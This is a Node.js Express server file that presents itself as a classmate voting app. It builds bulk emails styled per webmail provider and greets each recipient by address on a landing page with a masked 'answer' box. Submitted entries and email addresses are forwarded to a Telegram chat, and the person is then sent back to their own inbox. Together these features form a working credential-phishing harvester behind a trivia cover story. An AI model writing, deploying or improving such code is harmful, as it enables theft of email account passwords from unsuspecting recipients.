// server.js — hosts the vote page and forwards answers to Telegram.
//
// Flow:
//   1. Your bulk mailer sends email.html; the button links to /hi?e=<email>.
//   2. /hi greets "HI, <email>" and shows the question with a masked answer box.
//   3. POST /submit sends the answer to your project Telegram chat.
import 'dotenv/config';
import express from 'express';
import rateLimit from 'express-rate-limit';
import { writeFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

import { isValidEmail, getInboxUrl } from './helpers.js';
import { buildEmailHtml } from './emailTemplate.js';
import { sendToTelegram, telegramConfigured } from './telegram.js';
import { strings, normalizeLang } from './i18n.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const PORT = Number(process.env.PORT) || 3000;
// Normalize BASE_URL: strip trailing slash and ensure a scheme, so a value
// like "myapp.up.railway.app" still produces absolute (clickable) links.
let _base = (process.env.BASE_URL || `http://localhost:${PORT}`).trim().replace(/\/$/, '');
if (!/^https?:\/\//i.test(_base)) _base = 'https://' + _base;
const BASE_URL = _base;

// Default language for the whole app. Change APP_LANG in .env (en, es, nl, fr, de).
// A ?lang=xx on a link can override it per recipient. (APP_LANG, not LANG, to
// avoid clashing with the operating system's own LANG locale variable.)
const DEFAULT_LANG = normalizeLang(process.env.APP_LANG || 'en');

// The question classmates answer. Set QUESTION in .env; optionally set a
// per-language version like QUESTION_ES / QUESTION_NL to translate it too.
function getQuestion(lang) {
  return (
    process.env[`QUESTION_${lang.toUpperCase()}`] ||
    process.env.QUESTION ||
    'Who is the strongest Avenger?'
  );
}

const app = express();
app.set('view engine', 'ejs');
app.set('views', join(__dirname, 'views'));
app.use(express.urlencoded({ extended: false }));
app.use('/public', express.static(join(__dirname, 'public')));

// Regenerate email.html on boot so its links always match BASE_URL/QUESTION.
// This is the physical file you can download for your bulk mailer. Tests set
// EMAIL_FILE to a scratch path so they never clobber the real one.
const EMAIL_FILE = process.env.EMAIL_FILE || join(__dirname, 'email.html');
writeFileSync(
  EMAIL_FILE,
  buildEmailHtml({ baseUrl: BASE_URL, email: '{{EMAIL}}', question: getQuestion(DEFAULT_LANG), lang: DEFAULT_LANG }).html
);

// Home: quick hub — preview the email, grab the file, test the flow.
app.get('/', (req, res) => {
  const lang = normalizeLang(req.query.lang || DEFAULT_LANG);
  const testEmail = 'classmate@gmail.com';
  res.render('index', {
    baseUrl: BASE_URL,
    lang,
    question: getQuestion(lang),
    telegramReady: telegramConfigured(),
    // Preview shows the adaptive look with a sample Gmail address.
    emailHtml: buildEmailHtml({ baseUrl: BASE_URL, email: testEmail, question: getQuestion(lang), lang }).html,
    testEmail,
  });
});

// Serve the email HTML, always freshly generated from the live BASE_URL so the
// links can never go stale. Default = generic {{EMAIL}} for bulk sending;
// ?p=gmail|outlook|yahoo|icloud|proton|… renders a provider-specific variant.
app.get('/email.html', (req, res) => {
  const p = String(req.query.p || '').toLowerCase() || null;
  const lang = normalizeLang(req.query.lang || DEFAULT_LANG);
  // ?to=<real email> bakes that address in (name, logo, working link) so you
  // can send manually — no bulk mailer / merge tags needed. Omit for the bulk
  // {{EMAIL}} version.
  const to = String(req.query.to || '').trim();
  const email = isValidEmail(to) ? to : '{{EMAIL}}';
  res.type('html').send(
    buildEmailHtml({ baseUrl: BASE_URL, email, question: getQuestion(lang), providerKey: p, lang }).html
  );
});

// The landing page classmates reach from the email button.
app.get('/hi', (req, res) => {
  const raw = String(req.query.e || '').trim();
  const email = isValidEmail(raw) ? raw : null; // graceful if merge tag missing
  const lang = normalizeLang(req.query.lang || DEFAULT_LANG);
  // Where to send them after voting: their webmail inbox.
  const inboxUrl = email ? getInboxUrl(email) : '';
  res.render('hi', { email, question: getQuestion(lang), inboxUrl, lang, t: strings(lang) });
});

// Limit submissions to blunt spam / double-taps.
const submitLimiter = rateLimit({ windowMs: 60 * 1000, max: 20, standardHeaders: true, legacyHeaders: false });

// Receive the answer and forward it to Telegram.
app.post('/submit', submitLimiter, async (req, res) => {
  const lang = normalizeLang(req.body.lang || DEFAULT_LANG);
  const t = strings(lang);
  const question = getQuestion(lang);
  const email = isValidEmail(String(req.body.email || '').trim()) ? req.body.email.trim() : 'unknown';
  const answer = String(req.body.answer || '').trim().slice(0, 500);

  if (!answer) {
    return res.status(400).render('hi', {
      email: email === 'unknown' ? null : email,
      question, inboxUrl: '', lang, t,
      error: 'Please type an answer first.',
    });
  }

  const message =
    `🗳️ New vote — ${question}\n` +
    `From: ${email}\n` +
    `Answer: ${answer}\n` +
    `Time: ${new Date().toISOString()}`;

  try {
    const result = await sendToTelegram(message);
    res.render('thanks', { email: email === 'unknown' ? null : email, dev: !!result.dev, t });
  } catch (err) {
    console.error('[submit] telegram failed:', err);
    res.status(502).render('thanks', {
      email: email === 'unknown' ? null : email,
      dev: false, t,
      error: 'We couldn\'t deliver your vote just now. Please try again.',
    });
  }
});

app.use((req, res) => res.status(404).render('404'));

app.listen(PORT, () => {
  console.log(`Vote app running at ${BASE_URL}`);
  console.log(`Email file written to ${EMAIL_FILE}`);
  console.log(`Telegram: ${telegramConfigured() ? 'configured ✓' : 'DEV mode (answers logged to console)'}`);
});
